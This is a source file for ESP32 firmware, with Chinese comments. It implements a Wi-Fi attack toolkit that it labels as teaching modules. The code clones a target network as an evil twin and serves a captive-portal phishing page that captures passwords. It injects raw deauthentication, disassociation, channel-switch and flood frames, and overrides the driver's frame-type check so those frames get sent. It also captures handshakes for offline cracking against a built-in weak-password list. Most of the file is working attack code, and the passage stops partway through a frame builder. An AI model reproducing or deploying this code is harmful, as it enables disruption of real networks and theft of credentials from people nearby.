/**
 * ESP32 无线网络开发固件 (V2: AP 热点 + Web 管理后台 + 3 大安全教学验证模块)
 *
 * 行为:
 *  - 上电串口日志 115200 (烧录台「串口控制台」可见)
 *  - 开热点 SSID = WiFi-<MAC尾4hex>  密码 00000000  (与参考站一致)
 *  - http://192.168.4.1/admin.html  Neo-brutalism 后台 (内嵌页面)
 *  - Captive Portal: UDP 53 通配解析 + OS 探测路径 302, 连热点自动弹后台 (或双子钓鱼页)
 *  - Serial JSON 遥测: 串口额外输出 NDJSON(每行一个 {...}) 只读事件流,
 *    供 PC 命令行 / 便携硬件即插即用 (不含 Probe 响应/管理帧/EAPOL/凭据等材料)
 *
 * 3 大教学验证模块:
 *  1. 👤 Evil Twin (邪恶双子 & Captive Portal 凭据捕获验证)
 *  2. ⛔ Deauther (802.11 管理帧机制与取消认证阻断验证)
 *  3. ⬍ Handshake & Crack (4-Way Handshake 捕获与弱口令离线字典跑包审计)
 *
 * Serial 遥测协议 (NDJSON, UTF-8, 115200, 每行一个对象):
 *   {"v":1,"ts":<ms>,"event":"<type>", ...}
 *   event 取值 (全部为只读数据镜像):
 *     boot          上电: chip/fw/ssid/mac/channel
 *     log           日志: id/line (与环形缓冲同源)
 *     heartbeat     30s 周期: clients/heap/uptime
 *     scan_result   扫描: 每个 AP 一条 ssid/rssi/ch/bssid/auth
 *     client_join   softAP 客户端数增加: clients
 *     client_leave  softAP 客户端数减少: clients
 *     lab_state     教学模块中性状态: module/running (不含任何凭据/握手材料)
 *   约定: 以 '{' 开头的行为 JSON, 其余为原文本日志, 消费者按行解析即可。
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>          // Captive Portal: UDP 53 通配解析 → 192.168.4.1
#include <ESPmDNS.h>
#include <Preferences.h>
#include <nvs_flash.h>
#include "esp_wifi.h"           // esp_wifi_80211_tx: 802.11 raw 帧注入 (Deauther 真实发送)
#include "soc/soc_caps.h"       // SOC_WIFI_SUPPORT_5G / SOC_BLE_SUPPORTED: 芯片编译期能力门控
#include "esp_random.h"         // esp_random(): 硬件 TRNG, 用于生成设备唯一的出厂后台口令
#include "admin_page.h"
#include "vendor_db.h"          // P4: 厂商 / Company ID / Service UUID 名称表 (构建时由 data/vendor_db.js 压缩内嵌)
#include "wifi_weak_dict.h"     // 内置 7,153 条弱口令 (与 server/data/weak-passwords.txt 同序)
#include "mbedtls/md.h"         // PBKDF2-HMAC-SHA1 / HMAC-SHA1 / HMAC-MD5 (板载跑包)
#include "sdkconfig.h"          // CONFIG_IEEE802154_ENABLED: 802.15.4 组件是否编入框架

/* 解除 802.11 raw 注入的帧类型白名单。
 * C5 的 libnet80211 在 esp_wifi_80211_tx 前调用本函数校验帧, 对 Deauth(0xC0)/Disassoc(0xA0)
 * 打印 "unsupport frame type" 并返回 258 (ESP_ERR_INVALID_ARG), 导致远程压制完全无效。
 * 该符号为库内弱校验函数, 覆盖后返回 0 (放行) 即可发送任意管理帧 —— ESP32 Marauder 同法。 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }

/* BLE 能力门控 (P2): 芯片需有 BLE 硬件, 且本构建未被显式裁剪。
 * 经典 ESP32 例外 —— 它的 BLE 走 Bluedroid (比 NimBLE 多约 810KB), 与 min_spiffs 的
 * 双 app 槽 (三系统引导 esp_ota_set_boot_partition 依赖) 在 4MB Flash 上无法共存,
 * 因此该 env 用 -DFW_BLE_DISABLED 裁剪 BLE, 其余 4 款 (C3/C5/C6/S3) 正常开放。 */
#if SOC_BLE_SUPPORTED && !defined(FW_BLE_DISABLED)
#define FW_BLE_SUPPORTED 1
#else
#define FW_BLE_SUPPORTED 0
#endif

#if FW_BLE_SUPPORTED
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#endif

/* 802.15.4 能力门控 (P3): 芯片需有 802.15.4 射频 (C5/C6), 且框架确实把该组件编进了
 * 静态库 (CONFIG_IEEE802154_ENABLED, 见框架包 sdkconfig)。其余芯片编译期裁掉, 源码不分叉。
 * 纯被动: promiscuous 只收不发, 不自动 ACK, 不做任何注入。 */
#if SOC_IEEE802154_SUPPORTED && defined(CONFIG_IEEE802154_ENABLED) && !defined(FW_IEEE802154_DISABLED)
#define FW_IEEE802154_SUPPORTED 1
#else
#define FW_IEEE802154_SUPPORTED 0
#endif

#if FW_IEEE802154_SUPPORTED
#include "esp_ieee802154.h"
#endif
#include "esp_ota_ops.h"
#include "esp_partition.h"
#include "esp_task_wdt.h"       // TWDT panic 模式: 挂死自愈 + 现场回溯 (真机 802.15.4 长跑挂死诊断)

/* ====== 脱机便携化: 0.96寸 OLED 屏幕 + 蜂鸣器 ======
 * 编译时 -DFW_OLED_ENABLED 启用 0.96寸/1.3寸 I2C OLED (SSD1306 128×64)
 * 编译时 -DFW_BUZZER_ENABLED 启用无源/有源蜂鸣器提示
 * 纯 Wire.h 极简驱动, 零第三方库依赖, 编译快、体积小 (仅占 ~1.5KB RAM, 3KB Flash) */
#ifdef FW_OLED_ENABLED
  #include "ssd1306_tiny.h"
  #ifndef FW_OLED_SDA
    #define FW_OLED_SDA 4
  #endif
  #ifndef FW_OLED_SCL
    #define FW_OLED_SCL 5
  #endif
  static TinySSD1306 oled;
  static bool sOledReady = false;
  static uint32_t sOledLastUpdate = 0;
  static const uint32_t OLED_REFRESH_MS = 500;  // 刷新间隔 500ms (2fps, 省电省CPU)
  static uint8_t sOledPage = 0;                 // 0=主状态页, 1=凭据展示页
  static char sOledLastPass[64] = {0};
#endif

#ifdef FW_BUZZER_ENABLED
  // 默认蜂鸣器引脚: GPIO13 (HW-982 板上 NC/空闲); 可通过 -DFW_BUZZER_PIN=x 覆盖
  #ifndef FW_BUZZER_PIN
    #define FW_BUZZER_PIN 13
  #endif
  static bool sBuzzerReady = false;
  // 蜂鸣队列: 非阻塞, 在 loop 中用 millis 驱动
  struct BuzzerNote { uint16_t freqHz; uint16_t durationMs; };
  static BuzzerNote sBuzzerQueue[8];
  static uint8_t sBuzzerHead = 0, sBuzzerTail = 0;
  static uint32_t sBuzzerNoteStart = 0;

  static void buzzerEnqueue(uint16_t freq, uint16_t ms) {
    uint8_t next = (sBuzzerTail + 1) % 8;
    if (next == sBuzzerHead) return;  // 队列满, 丢弃
    sBuzzerQueue[sBuzzerTail] = {freq, ms};
    sBuzzerTail = next;
  }
  // 预设音效
  static void buzzerBeepShort()   { buzzerEnqueue(2700, 80); buzzerEnqueue(0, 50); buzzerEnqueue(2700, 80); }
  static void buzzerBeepSuccess() { buzzerEnqueue(1000, 120); buzzerEnqueue(0, 60); buzzerEnqueue(1500, 120); buzzerEnqueue(0, 60); buzzerEnqueue(2000, 200); }
  static void buzzerBeepAlert()   { buzzerEnqueue(3000, 300); buzzerEnqueue(0, 100); buzzerEnqueue(3000, 300); }
#endif

#ifndef FW_VERSION
  #define FW_VERSION "1.1.0"
#endif
#ifndef FW_BUILD_NS
  #define FW_BUILD_NS "esp32-wireless-dev"
#endif

static const char *AP_PASSWORD  = "00000000";
static const char *ADMIN_HTML_C = "http://192.168.4.1/admin.html";
static const uint8_t AP_CHANNEL_DEFAULT = 6;
static const uint16_t DNS_PORT = 53;

WebServer server(80);
DNSServer dnsServer;             // Captive Portal DNS 劫持 (通配 * → AP IP)
static Preferences sPrefs;
static String apSsid;
static uint8_t apChannel = AP_CHANNEL_DEFAULT;
static uint8_t apChannelActive = AP_CHANNEL_DEFAULT; // 空口当前实际工作信道 (攻击期间临时切至目标信道; 配置值 apChannel 不变)
static String sAdminToken;                            // 后台访问口令 (NVS: adminToken)
static bool sMustChangeToken = false;                 // 仍在使用出厂初始口令, 需引导用户修改
// 旧版固件的全局静态口令: 升级后自动轮换为设备唯一随机口令 (不保留可用弱口令)
static const char *LEGACY_DEFAULT_TOKEN = "esp32admin";

/* ---------------- 日志环形缓冲 (供后台绿字日志) ---------------- */
struct LogEntry {
  uint32_t id;
  char line[160];
};
static LogEntry sLogs[64];        // 环形 64 条
static uint8_t  sLogHead = 0;     // 下一个写入位置
static uint32_t sLogId   = 0;     // 单调递增

static String jsonEscape(const String &in);   // 前置声明 (emitJson/log 需要)

// USB CDC (HWCDC) 背压防护: 主机端口真正连接时才允许串口输出, 且 TX 环形缓冲空闲量足够。
// 真机事故 (coredump 双次实证): 端口打开但主机不读取 (背压) 或端口刚关闭的标志翻转窗口,
// HWCDC::write 每行最多阻塞 ~2s (20×100ms 封顶); WiFi 事件风暴 (软 AP 重启/收尾) 下
// 单次 handleClient 内累计 >60s 不喂 TWDT → panic 重启 (TWDT 救活并留了 coredump)。
// isConnected 为假时整行丢弃 — 循环日志/遥测/网页均不受影响, 串口恢复后新日志照常。
static bool serialSafe(size_t len) {
  if (!Serial.isConnected()) return false;
  return (size_t)Serial.availableForWrite() >= len + 1;   // +1 给 println 的换行
}

// TWDT 语义下沉: 日志推进 = 任务仍在前进。事件风暴 (软 AP 重启/双子跳频) 下 loopTask
// 可能在单次 handleClient 内连打几十行日志, 即使每行都有界 (~100ms 锁等待), 累计也会
// 超过 60s 不回 loop() 喂狗 → 误判 panic (coredump 三次实证)。在日志路径喂狗让 WDT
// 只对"真正卡死在非日志阻塞调用"报警。注意 log() 会从 WiFi 事件回调 (NetworkEvents
// 任务上下文) 被调用 — 该任务未订阅 TWDT, 直接 esp_task_wdt_reset 会刷
// "task not found" 错误, 故仅在 loopTask 上下文喂狗。
static TaskHandle_t sLoopTaskHandle = nullptr;   // setup() 开头捕获
static void wdtProgress() {
  if (sLoopTaskHandle && xTaskGetCurrentTaskHandle() == sLoopTaskHandle)
    esp_task_wdt_reset();
}

/* ---------------- Serial JSON 遥测 (NDJSON, 只读镜像) ---------------- */
// 统一事件发射: 串口输出一行 {"v":1,"ts":...,"event":...,<fields>}
// fields 需为已拼好的合法 JSON 片段 (不含最外层花括号), 例如 "\"clients\":2"
// 仅镜像已有的只读数据; 绝不输出 Probe/管理帧/EAPOL/握手材料/凭据。
static void emitJson(const String &event, const String &fields) {
  wdtProgress();
  String out = "{\"v\":1,\"ts\":" + String(millis()) + ",\"event\":\"" + event + "\"";
  if (fields.length()) out += "," + fields;
  out += "}";
  if (serialSafe(out.length())) Serial.println(out);
}

// 教学模块状态遥测: 只发模块名与 running 布尔, 不携带任何敏感载荷
static void emitLabState(const char *module, bool running) {
  emitJson("lab_state", "\"module\":\"" + String(module) +
           "\",\"running\":" + String(running ? "true" : "false"));
}

static void log(const String &line) {
  if (serialSafe(line.length())) Serial.println(line);
  LogEntry &e = sLogs[sLogHead];
  e.id = ++sLogId;
  strlcpy(e.line, line.c_str(), sizeof(e.line));
  sLogHead = (sLogHead + 1) % (sizeof(sLogs) / sizeof(sLogs[0]));
  // 镜像一条结构化日志事件, 供外部按行解析 (line 已 jsonEscape 过)
  emitJson("log", "\"id\":" + String(sLogId) + ",\"line\":\"" + jsonEscape(line) + "\"");
}

static String jsonEscape(const String &in) {
  String out;
  out.reserve(in.length() + 8);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '"':  out += "\\\""; break;
      case '\\': out += "\\\\"; break;
      case '\n': out += "\\n";  break;
      case '\r': break;
      case '\t': out += "\\t";  break;
      default:
        if ((uint8_t)c < 0x20) {
          char buf[8];
          snprintf(buf, sizeof(buf), "\\u%04X", c);
          out += buf;
        } else out += c;
    }
  }
  return out;
}

static String htmlEscape(const String &in) {
  String out;
  out.reserve(in.length() + 16);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '<':  out += "&lt;"; break;
      case '>':  out += "&gt;"; break;
      case '&':  out += "&amp;"; break;
      case '"':  out += "&quot;"; break;
      case '\'': out += "&#39;"; break;
      default:   out += c; break;
    }
  }
  return out;
}

static String extractJson(const String &body, const char *key) {
  String search = "\"" + String(key) + "\"";
  int k = body.indexOf(search);
  if (k < 0) return "";
  int colon = body.indexOf(':', k + search.length());
  if (colon < 0) return "";
  colon++; // 移过冒号
  while (colon < (int)body.length() && (body[colon] == ' ' || body[colon] == '\t' || body[colon] == '\r' || body[colon] == '\n')) colon++;
  if (colon >= (int)body.length()) return "";
  if (body[colon] == '"') {
    int q1 = colon;
    int q2 = q1 + 1;
    while (q2 < (int)body.length()) {
      if (body[q2] == '"' && body[q2 - 1] != '\\') break;
      q2++;
    }
    return (q2 < (int)body.length()) ? body.substring(q1 + 1, q2) : "";
  }
  int comma = body.indexOf(',', colon);
  int brace = body.indexOf('}', colon);
  int end = (comma < 0) ? brace : (brace < 0 ? comma : min(comma, brace));
  if (end < 0) end = body.length();
  String val = body.substring(colon, end);
  val.trim();
  return val;
}

/* ---------------- 主目标 / 双子目标 (仅 RAM 记录) ---------------- */
struct Target {
  bool   set = false;
  String ssid, bssid, auth;
  int    channel = 0;
  int    rssi    = 0;
};
static Target sTarget;   // 主目标: 克隆热点与持续 Deauth 的对象 (2.4G 或 5G 非 DFS)

/* 双子目标列表 (可增删, 最多 MAX_TWINS 条): 通常是同一路由器另一个 BSSID;
 * 勾选「假 AP」时, 攻击跳频到该信道还额外广播一个伪造信标 (空口上真能看到)。 */
#define MAX_TWINS 4
struct TwinTarget {
  bool   used = false;
  String ssid, bssid, auth;
  int    channel = 0;
  int    rssi    = 0;
  bool   fakeAp  = false;
};
static TwinTarget sTwins[MAX_TWINS];

static int twinCount() {
  int n = 0;
  for (int i = 0; i < MAX_TWINS; i++) if (sTwins[i].used) n++;
  return n;
}

static void twinRemoveAt(int idx) {
  if (idx < 0 || idx >= MAX_TWINS) return;
  for (int i = idx; i < MAX_TWINS - 1; i++) sTwins[i] = sTwins[i + 1];
  sTwins[MAX_TWINS - 1] = TwinTarget();
}

// 按 BSSID 查找 (重复添加同一条时覆盖), 未找到返回 -1
static int twinFindByBssid(const String &bssid) {
  for (int i = 0; i < MAX_TWINS; i++)
    if (sTwins[i].used && sTwins[i].bssid == bssid) return i;
  return -1;
}

static int twinFirstFree() {
  for (int i = 0; i < MAX_TWINS; i++) if (!sTwins[i].used) return i;
  return -1;
}

/* ---------------- 1. 邪恶双子 (Evil Twin & 凭据捕获) ----------------
 * 真实攻击链 (发起 = eviltwinStartAttack, 收尾 = eviltwinStopAttack):
 *   1) 本机热点改名为与主目标一模一样的 SSID, 开放无密码, 信道=主目标信道 → victim 免密直连
 *   2) 自动对主目标持续注入 Deauth (复用 DeauthEngine, 本机已在目标信道, 无需切信道)
 *   3) 设了双子目标 → 每 2s 跳频到双子信道连发 3 帧 Deauth 再跳回 → 目标 5G 频段持续瘫痪,
 *      客户端只能落到 2.4G 同名克隆热点 (单射频 C5 无法同时广播双频, 跳频是唯一可行方案)
 *   4) Captive Portal 自动弹钓鱼页 → 捕获第一条凭据后自动停止注入 (热点保持同名开放供浏览),
 *      手动停止时恢复原热点名/密码/信道
 */
struct EvilTwinState {
  bool active = false;
  String cloneSsid = "";
  int templateId = 1;
  uint32_t startTime = 0;
  // —— 真实克隆攻击状态 ——
  bool     apCloned = false;      // 热点是否已真实改名 (停止时需恢复)
  String   restoreSsid = "";      // 停止时恢复的原热点名
  uint8_t  restoreChannel = 0;    // 停止时恢复的配置信道
  bool     deauthAuto = false;    // Deauth 由双子自动启动 (捕获凭据时自动停止)
  bool     caught = false;        // 已捕获第一条凭据 (攻击达成, 停止空口干扰)
  // —— 双子目标周期跳频注入 (轮询列表) ——
  bool     hopEnabled = false;    // 至少 1 条有效双子目标时启用
  bool     hopping = false;       // 当前正处于双子信道跳频窗口
  int8_t   hopCurrent = -1;       // 本轮正在服务的双子条目下标
  uint8_t  hopNext     = 0;       // 下一轮起始下标 (轮询)
  uint8_t  twinFrame[26];         // 当前条目预构的 Deauth 帧
  bool     twinFrameReady = false;
  uint8_t  beaconFrame[120];      // 假 AP 伪造信标 (变长)
  uint16_t beaconLen = 0;
  uint8_t  twinFramesLeft = 0;    // 本窗口剩余 Deauth 帧
  uint8_t  beaconLeft = 0;        // 本窗口剩余信标帧
  uint32_t lastHopAt = 0;         // 上次跳频时刻
  uint32_t twinFrameCount = 0;    // 双子信道累计成功发送 Deauth 帧
  uint32_t beaconCount = 0;       // 累计成功发送的伪造信标数
  uint32_t hopCount = 0;          // 累计跳频次数
  // —— 阶段 1: 先抓 M1/M2 再开克隆热点 (否则门户无法验真密码) ——
  bool     hsFirst = true;        // 是否启用「先抓握手」阶段 (可被 /api/eviltwin/start 关闭)
  bool     hsPhase = false;       // 当前处于阶段 1: 只是监听 + 踢线, 尚未改名克隆
  bool     hsGot   = false;       // 阶段 1 是否真的抓到了可用于验真的握手
  uint32_t hsPhaseStart = 0;      // 阶段 1 开始时刻
  uint32_t hsPhaseLimitMs = 15000;// 阶段 1 最长等待 (超时则放弃验真, 直接开克隆)
};
static EvilTwinState sEvilTwin;

struct CredentialEntry {
  uint32_t id;
  char clientIp[20];
  char pass[64];
  uint32_t capturedAt;
  bool verified;   // true = 已用抓到的 M1/M2 做过 MIC 校验且通过 (密码真实有效)
};
static CredentialEntry sCreds[16];
static uint8_t sCredHead = 0;
static uint8_t sCredCount = 0;
static uint32_t sCredId = 0;
static uint32_t sPortalRejects = 0;   // 门户提交但未通过 MIC 校验的次数 (不写入凭据表)

static void addCredential(const String &clientIp, const String &pass, bool verified) {
  CredentialEntry &e = sCreds[sCredHead];
  e.id = ++sCredId;
  strlcpy(e.clientIp, clientIp.c_str(), sizeof(e.clientIp));
  strlcpy(e.pass, pass.c_str(), sizeof(e.pass));
  e.capturedAt = millis();
  e.verified = verified;
  sCredHead = (sCredHead + 1) % 16;
  if (sCredCount < 16) sCredCount++;
  log("[eviltwin] 捕获到客户端提交的凭据: IP=" + clientIp + " 密码长度=" + String(pass.length()) +
      (verified ? " (已通过握手 MIC 校验)" : " (未校验: 无可用握手)") +
      " (明文仅存于凭据表, 不写入日志/串口遥测)");
}

/* ---------------- 2. 取消认证器 (Deauther 真实帧注入) ---------------- */
// 攻击技术位掩码: 主攻击模式与组合攻击都归一到同一张掩码, 引擎按位轮询发送。
enum : uint16_t {
  ATK_DEAUTH      = 1 << 0,  // 解除认证帧 (广播 = PMF 绕过: 组地址管理帧无 PMF 保护)
  ATK_DISASSOC    = 1 << 1,  // 取消关联帧
  ATK_CSA         = 1 << 2,  // CSA 信道欺骗 (伪造信标 + Spectrum Mgmt Action)
  ATK_TPC_CSA     = 1 << 3,  // 信标操作: TPC(35) + CSA(37) 双 IE, 只发信标不踢线
  ATK_AUTH_FLOOD  = 1 << 4,  // 认证泛洪 (随机源 MAC 的 Open System Auth)
  ATK_ASSOC_FLOOD = 1 << 5,  // 关联泛洪 (随机源 MAC 的 Assoc Request)
  ATK_SAE_FLOOD   = 1 << 6,  // WPA3 SAE 泛洪 (Auth alg=3 Commit)
  ATK_BCAST       = 1 << 7,  // 广播泛洪 (广播数据帧灌流)
  ATK_BEACON      = 1 << 8,  // 信标泛洪 (随机 SSID/BSSID 假 AP)
};
static const uint8_t ATK_TECH_COUNT = 9;

struct DeauthEngine {
  bool running = false;
  String targetBssid = "";
  uint8_t targetChannel = 6;
  uint8_t reasonCode = 1;
  uint32_t frameCount = 0;
  uint32_t lastTxTime = 0;
  uint16_t rateLimitMs = 100; // 默认 10 fps
  uint32_t lastLogTime = 0;
  // 真实 802.11 帧注入: 预构 Deauthentication 管理帧, 经 esp_wifi_80211_tx 实际发出
  uint8_t frame[26];       // FC(2)+Duration(2)+RX(6)+TX(6)+BSSID(6)+Seq(2)+Reason(2)
  bool frameReady = false; // 目标 BSSID 合法并已构帧后才允许发送
  bool txOk = false;       // 最近一次 TX 是否成功 (供后台显示真实发送状态)
  int32_t lastTxErr = 0;   // 最近一次 esp_wifi_80211_tx 返回码 (0=ESP_OK)
  bool channelMoved = false;  // 攻击期间已临时把热点切到目标信道 (停止时恢复)
  uint8_t restoreChannel = 0; // 停止时应恢复的配置信道
  // 平台限制: 驱动在 esp_wifi_80211_tx 前做帧类型校验 (ieee80211_raw_frame_sanity_check),
  // 拒绝 Deauth(0xC0)/Disassoc(0xA0) 并返回 258。本固件已覆盖该函数解除白名单, 真 Deauth 可用;
  // 下面两个标志仅作兜底: 若某构建仍被拒, 自动改用伪造 CSA 让客户端跟随切信道掉线。
  bool platformBlocked = false;
  bool csaMode = false;        // true = 用 CSA 信标/Action 替代被拒的 Deauth 帧
  uint8_t csaBeacon[128];       // 伪造 CSA 信标 (BSSID 冒用目标 AP)
  uint16_t csaBeaconLen = 0;
  uint8_t csaAction[48];       // 伪造 Spectrum Management CSA Action 帧
  uint8_t csaActionLen = 0;
  uint32_t csaCount = 0;
  uint8_t csaNewChannel = 1;   // 让客户端切去的假信道
  // —— 主攻击模式 / 组合攻击 / 持续时间 (参考攻击面板) ——
  // 主攻击模式: 0=PMF 绕过·全设备踢线, 1=按加密分流, 2=不使用主攻击 (只跑组合)
  uint8_t  primaryMode = 0;
  uint16_t comboMask = 0;      // 组合攻击位掩码 (ATK_*)
  uint8_t  comboIndex = 0;     // 技术轮询游标
  uint8_t  techCursor = 0;     // 最近一次发出的技术 (状态显示用)
  uint32_t techCount[ATK_TECH_COUNT] = {0};  // 各技术成功发送计数
  uint32_t durationMs = 0;     // 0 = 不限时
  uint32_t stopAt = 0;         // 运行期绝对截止时刻
  uint32_t startedAt = 0;
  // 泛洪用同一源 MAC 完成 "认证 → 关联" 两阶段 (未认证的 AssocReq 会被真实 AP 直接丢弃)
  uint8_t  floodMac[6] = {0};
  bool     assocAuthPhase = true;
  // —— 客户端定向解除认证 ——
  // 广播 Deauth 在多数 Wi-Fi 6 手机/Windows 网卡上被驱动层直接丢弃 (帧数一直涨但目标无反应),
  // 因此从空口数据帧学习与该 AP 关联的客户端 MAC, 改为单播定向踢线。
  uint8_t  targetMac[6] = {0}; // targetBssid 的二进制形式 (逐帧比对, 避免重复解析字符串)
  bool     targetMacReady = false;
  uint32_t unicastCount = 0;   // 成功发出的单播 Deauth 帧数
  uint32_t unicastCycle = 0;   // 单播/广播轮换游标 (每 4 帧留 1 帧广播兜底)
  uint8_t  reasonCycle = 0;    // 单播原因码轮换游标
};
static DeauthEngine sDeauth;

// 解析 "AA:BB:CC:DD:EE:FF" → 6 字节; 不合法返回 false
static bool parseBssid(const String &s, uint8_t out[6]) {
  const char *p = s.c_str();
  for (int i = 0; i < 6; i++) {
    char *end = nullptr;
    long v = strtol(p, &end, 16);
    if (end == p || v < 0 || v > 0xFF) return false;
    out[i] = (uint8_t)v;
    p = end;
    if (i < 5) { if (*p != ':') return false; p++; }
  }
  return *p == '\0';
}

// 构建 26 字节 Deauth 管理帧 (IEEE 802.11 Type=管理, Subtype=12)。序列号交由系统填充 (en_sys_seq=true)。

// 802.11 raw 帧发送 (带接口回退): Deauth 等白名单外帧必须先开启 promiscuous,
// 否则 C5 WiFi 库返回 258 (ESP_ERR_WIFI_NOT_STARTED); 信标/Probe/Action 无此要求。
static esp_err_t wifi80211Tx(wifi_interface_t ifx, const void *buf, int len, bool sysSeq) {
  esp_err_t e = esp_wifi_80211_tx(ifx, buf, len, sysSeq);
  if (e != ESP_OK && ifx == WIFI_IF_AP) {
    e = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sysSeq);
  }
  return e;
}

// 信标帧专用发送路径: C5 实测经 AP 接口注入的 Beacon 虽返回 ESP_OK, 但空口上第三方网卡
// 扫不到 (驱动对 AP 接口的 Beacon 做了特殊处理); 改由 STA 接口发出则能被正常扫描。
// 真机验证: 同一帧 ap 接口 4 次扫描 0 命中, sta 接口 4 次扫描 4 次命中。
static esp_err_t wifiBeaconTx(const void *buf, int len) {
  esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, true);
  if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_AP, buf, len, true);
  return e;
}

// receiver=广播 (踢掉目标 AP 下所有客户端), transmitter/BSSID=目标 AP, 客户端会信以为真断线。
// 通用版: 供 Deauth 引擎与邪恶双子 (主/双子两个 BSSID) 共用。
static bool buildDeauthFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *f) {
  uint8_t mac[6];
  String bssid = bssidIn;
  bssid.trim();
  if (!parseBssid(bssid, mac)) return false;
  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  f[0] = 0xC0; f[1] = 0x00;               // Frame Control: 管理 / Deauthentication (0x00c0)
  f[2] = 0x3A; f[3] = 0x01;               // Duration/ID
  memcpy(f + 4,  BROADCAST, 6);           // Address 1: 接收端 (广播)
  memcpy(f + 10, mac, 6);                 // Address 2: 发送端 (目标 AP BSSID)
  memcpy(f + 16, mac, 6);                 // Address 3: BSSID
  f[22] = 0x00; f[23] = 0x00;             // Sequence Control: 由系统填充
  f[24] = reason & 0xFF; f[25] = 0x00;    // Reason Code (小端)
  return true;
}

static void buildDeauthFrame(DeauthEngine &d) {
  d.frameReady = buildDeauthFrameRaw(d.targetBssid, d.reasonCode, d.frame);
  d.targetMacReady = parseBssid(d.targetBssid, d.targetMac);
}

/* ---- 客户端 MAC 学习 (定向单播踢线) ----
 * 数据帧的地址组合即可判定「谁在跟目标 AP 通信」:
 *   ToDS=1/FromDS=0: DA=AP(addr1) / SA=客户端(addr2)
 *   ToDS=0/FromDS=1: DA=客户端(addr1) / SA=AP(addr2)
 * 只记录 MAC 与时间戳, 不解析载荷、不落盘、不外传。
 */
static const int MAX_KNOWN_STAS = 12;
struct KnownSta { uint8_t mac[6]; uint32_t lastSeen; uint32_t frames; };
static KnownSta sKnownStas[MAX_KNOWN_STAS];
static uint8_t sKnownStaCount = 0;
static uint8_t sKnownStaCursor = 0;

static String formatMac(const uint8_t *m);   // 前置声明 (定义在下方)

static void resetKnownStas() {
  memset(sKnownStas, 0, sizeof(sKnownStas));
  sKnownStaCount = 0;
  sKnownStaCursor = 0;
  sDeauth.unicastCount = 0;
  sDeauth.unicastCycle = 0;
  sDeauth.reasonCycle = 0;
}

// 单播 Deauth: DA=客户端, TA/BSSID=目标 AP。WPA2 (未协商 PMF) 客户端必定处理。
static bool buildUnicastDeauth(const uint8_t *dst, const uint8_t *bssid, uint8_t reason, uint8_t *f) {
  if (!dst || !bssid) return false;
  f[0] = 0xC0; f[1] = 0x00;
  f[2] = 0x3A; f[3] = 0x01;
  memcpy(f + 4,  dst, 6);      // Address 1: 接收端 (具体客户端)
  memcpy(f + 10, bssid, 6);    // Address 2: 发送端 (目标 AP)
  memcpy(f + 16, bssid, 6);    // Address 3: BSSID
  f[22] = 0x00; f[23] = 0x00;  // 序列号由系统填充
  f[24] = reason & 0xFF; f[25] = 0x00;
  return true;
}

// 从空口帧学习目标 AP 下的客户端 MAC (仅当 Deauth 引擎运行且目标已就绪)
static void learnClientMac(const uint8_t *f, int len) {
  if (len < 24 || !sDeauth.targetMacReady) return;
  if (((f[0] >> 2) & 0x03) != 2) return;              // 只取数据帧 (含 QoS/Null/EAPOL)
  const bool toDs = (f[1] & 0x01) != 0;
  const bool fromDs = (f[1] & 0x02) != 0;
  if (toDs == fromDs) return;                          // IBSS / WDS 不作数
  const uint8_t *bssid = toDs ? (f + 4) : (f + 10);
  const uint8_t *sta   = toDs ? (f + 10) : (f + 4);
  if ((sta[0] & 0x01) || (bssid[0] & 0x01)) return;    // 组地址跳过
  if (memcmp(bssid, sDeauth.targetMac, 6) != 0) return;
  if (memcmp(sta, sDeauth.targetMac, 6) == 0) return;
  for (int i = 0; i < sKnownStaCount; i++) {
    if (memcmp(sKnownStas[i].mac, sta, 6) == 0) {
      sKnownStas[i].lastSeen = millis();
      sKnownStas[i].frames++;
      return;
    }
  }
  int slot = -1;
  if (sKnownStaCount < MAX_KNOWN_STAS) {
    slot = sKnownStaCount++;
  } else {                                             // 表满: 淘汰最久未活动的条目
    slot = 0;
    for (int i = 1; i < MAX_KNOWN_STAS; i++)
      if (sKnownStas[i].lastSeen < sKnownStas[slot].lastSeen) slot = i;
  }
  memcpy(sKnownStas[slot].mac, sta, 6);
  sKnownStas[slot].lastSeen = millis();
  sKnownStas[slot].frames = 1;
  log("[deauth] 发现目标客户端 " + formatMac(sta) + " → 转为定向单播踢线");
}

// —— 组合攻击用的附加帧构造 (全部为真实 802.11 管理/数据帧) ——
// 随机源 MAC: 置 locally administered 位, 避免与真实厂商 OUI 冲突。
static void fillRandomMac(uint8_t mac[6]) {
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
  mac[0] = (uint8_t)((mac[0] & 0xFC) | 0x02);
}

// 取消关联帧 (Subtype=10): 与 Deauth 等价的断链帧, 部分客户端只处理其中一种。
static bool buildDisassocFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *f) {
  uint8_t mac[6];
  String bssid = bssidIn;
  bssid.trim();
  if (!parseBssid(bssid, mac)) return false;
  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  f[0] = 0xA0; f[1] = 0x00;               // 管理 / Disassociation
  f[2] = 0x3A; f[3] = 0x01;
  memcpy(f + 4,  BROADCAST, 6);
  memcpy(f + 10, mac, 6);
  memcpy(f + 16, mac, 6);
  f[22] = 0x00; f[23] = 0x00;             // 序列号由系统填充
  f[24] = reason & 0xFF; f[25] = 0x00;
  return true;
}

// 认证帧 (Subtype=11, Open System) —— 泛洪用: 大量随机客户端同时请求认证。
static uint16_t buildAuthFloodFrame(const uint8_t bssid[6], const uint8_t src[6], uint8_t *f) {
  f[0] = 0xB0; f[1] = 0x00;
  f[2] = 0x3A; f[3] = 0x01;
  memcpy(f + 4,  bssid, 6);      // Address 1: AP
  memcpy(f + 10, src, 6);        // Address 2: 随机客户端
  memcpy(f + 16, bssid, 6);      // Address 3: BSSID
  f[22] = 0x00; f[23] = 0x00;
